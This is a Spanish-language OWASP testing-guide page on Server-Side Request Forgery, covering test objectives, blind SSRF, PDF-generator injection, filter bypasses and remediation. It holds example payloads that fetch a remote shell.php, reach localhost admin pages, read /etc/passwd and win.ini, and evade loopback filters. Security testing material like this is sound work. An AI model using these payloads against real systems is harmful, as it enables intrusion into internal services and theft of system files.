Server-Side Request Forgery

ID
WSTG-INJT-19

Resumen

Las aplicaciones web a menudo interactúan con recursos internos o externos. Aunque se pueda esperar que solo el recurso previsto maneje los datos que se envían, los datos manejados de forma inadecuada pueden crear una situación en la que sean posibles ataques de inyección. Un tipo de ataque de inyección se denomina Server-side Request Forgery (SSRF). Un ataque SSRF exitoso puede otorgar al atacante acceso a acciones restringidas, servicios internos o archivos internos dentro de la aplicación o de la organización. En algunos casos, incluso puede conducir a ejecución remota de código (RCE).

Objetivos de la prueba

  • Identificar los puntos de inyección SSRF.
  • Probar si los puntos de inyección son explotables.
  • Evaluar la severidad de la vulnerabilidad.

Cómo probar

Al probar SSRF, se intenta hacer que el servidor objetivo cargue o guarde involuntariamente contenido que podría ser malicioso. La prueba más común es la de inclusión de archivos locales y remotos. Hay también otra faceta de SSRF: una relación de confianza que a menudo surge cuando el servidor de aplicaciones puede interactuar con otros sistemas de back-end que no son directamente accesibles para los usuarios. Estos sistemas de back-end suelen tener direcciones IP privadas no enrutables o están restringidos a ciertos hosts. Como están protegidos por la topología de red, a menudo carecen de controles más sofisticados. Estos sistemas internos suelen contener datos o funcionalidades sensibles.

Considérese la siguiente petición:

GET https://example.com/page?page=about.php

Se puede probar esta petición con los siguientes payloads.

Cargar el contenido de un archivo

GET https://example.com/page?page=https://malicioussite.com/shell.php

Acceder a una página restringida

GET https://example.com/page?page=http://localhost/admin

O bien:

GET https://example.com/page?page=http://127.0.0.1/admin

Se utiliza la interfaz de loopback para acceder a contenido restringido únicamente al host. Este mecanismo implica que, si se tiene acceso al host, también se tienen privilegios para acceder directamente a la página admin.

Este tipo de relaciones de confianza, en las que las peticiones originadas en la máquina local se tratan de manera diferente a las peticiones ordinarias, son a menudo lo que permite que SSRF sea una vulnerabilidad crítica.

Obtener un archivo local

GET https://example.com/page?page=file:///etc/passwd

Métodos HTTP utilizados

Todos los payloads anteriores pueden aplicarse a cualquier tipo de petición HTTP, y también podrían inyectarse en valores de cabeceras y cookies.

Una nota importante sobre SSRF con peticiones POST es que el SSRF también puede manifestarse de forma ciega (blind), porque la aplicación puede no devolver nada de inmediato. En cambio, los datos inyectados pueden usarse en otras funcionalidades, como informes en PDF, manejo de facturas o pedidos, etc., que pueden ser visibles para empleados o personal, pero no necesariamente para el usuario final o el evaluador.

Se puede encontrar más información sobre Blind SSRF aquí, o en la sección de referencias.

Generadores de PDF

En algunos casos, un servidor puede convertir archivos subidos al formato PDF. Se debe intentar inyectar elementos <iframe>, <img>, <base> o <script>, o funciones CSS url() que apunten a servicios internos.

<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">

Elusión de filtros comunes

Algunas aplicaciones bloquean las referencias a localhost y 127.0.0.1. Esto puede eludirse mediante:

  • El uso de representaciones alternativas de IP que se evalúan como 127.0.0.1:
    • Notación decimal: 2130706433
    • Notación octal: 017700000001
    • Abreviatura de IP: 127.1
    • IP alternativas tratadas como loopback: 127.0.0.2
  • Ofuscación de cadenas
  • Crear un DNS público en un dominio de su propiedad que se resuelva a 127.0.0.1

A veces la aplicación permite una entrada que coincide con cierta expresión, como un dominio. Esto puede eludirse si el analizador del esquema de URL no está correctamente implementado, lo que da lugar a ataques similares a los ataques semánticos.

  • Usar el carácter @ para separar la información de usuario (userinfo) del host: https://expected-domain@attacker-domain
  • Fragmentación de la URL con el carácter #: https://attacker-domain#expected-domain
  • Codificación URL
  • Fuzzing
  • Combinaciones de todo lo anterior

Para ver payloads adicionales y técnicas de elusión, consulte la sección de referencias.

Corrección

Se sabe que SSRF es uno de los ataques más difíciles de derrotar sin el uso de listas de permitidos que requieran permitir IP y URL específicas. Para más información sobre la prevención de SSRF, lea la Server Side Request Forgery Prevention Cheatsheet.
